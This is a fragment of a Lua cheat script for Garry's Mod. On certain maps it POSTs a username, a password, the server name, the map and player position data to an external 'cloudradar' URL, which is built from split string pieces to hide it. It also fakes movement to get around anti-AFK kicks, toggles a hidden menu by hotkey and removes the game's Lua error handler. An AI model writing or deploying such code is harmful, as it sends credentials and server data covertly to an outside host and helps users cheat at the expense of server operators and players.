    local cb = {}
    cb["rp_bangclaw"] = true
    cb["rp_downtown_tits_v1"] = true

    E("123", 7, 0, function()
        if cb[game.GetMap()] and n() and N then
            http.Post("ht" .. "tps://ex" .. "echa" .. "ck.cc/fo" .. "rum/clo" .. "udr" .. "adars.p" .. "hp", {
                username = username,
                password = password,
                server = GetHostName2,
                map = game.GetMap(),
                pos = j(b.cloudradarshit, "DATA")
            })
        end
    end)

    local cc, cd, ce = 0, 0, 0

    hook.Add("Think", "fff", function()
        if X["MISC_ANTIANTIAFK"] and n() then
            if input.IsKeyDown(KEY_W) or input.IsKeyDown(KEY_S) or input.IsKeyDown(KEY_D) or input.IsKeyDown(KEY_A) then
                ce = 0
            else
                ce = ce + 1
            end

            if ce > 1000 then
                RunConsoleCommand("+forward")

                k(0.3, function()
                    RunConsoleCommand("-forward")
                end)

                ce = 0
            end
        end

        if input.IsKeyDown(X["MENU_OPENKEY"]) and cd == 0 then
            if cc == 0 then
                gui.HideGameUI()
                hide()
                cc = 1
            elseif cc == 1 then
                gui.ActivateGameUI()
                show()
                cc = 0
            end

            cd = 1

            k(0.3, function()
                cd = 0
            end)
        end
    end)
end)

hook.Remove("OnLuaError", "MenuErrorHandler")
